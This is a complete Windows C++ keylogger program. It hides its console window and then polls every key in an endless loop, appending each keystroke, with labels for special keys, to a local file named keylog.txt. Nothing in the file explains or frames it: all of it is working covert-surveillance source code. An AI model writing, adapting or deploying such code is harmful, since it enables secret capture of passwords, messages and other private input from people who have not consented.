#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <Windows.h>

using namespace std;
#define LOG_FILE "keylog.txt"

void saveData(string data) {
    fstream file;

    file.open(LOG_FILE, ios::app);

    file << data;

    file.close();
}

int main() {
    HWND windowHandle = GetConsoleWindow();
    ShowWindow(windowHandle, SW_HIDE);
    map<int, string> specialKeys{
            {VK_SPACE, " "},
            {VK_RETURN, "\n"},
            {VK_BACK, "\b"},
            {VK_TAB, "[TAB]"},
            {VK_SHIFT, "[SHIFT]"},
            {VK_CONTROL, "[CTRL]"},
            {VK_MENU, "[ALT]"},
            {VK_CAPITAL, "[CAPS_LOCK]"}
    };


    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x01) {

                auto it = specialKeys.find(key);
                if (it != specialKeys.end()) {
                    saveData(it->second);
                }
                else {
                    if (GetKeyState(VK_CAPITAL)) {
                        saveData(string(1, (char)toupper(key)));
                    }
                    else {
                        saveData(string(1, (char)tolower(key)));
                    }
                    
                }
            }
        }

    }
	return 0;
}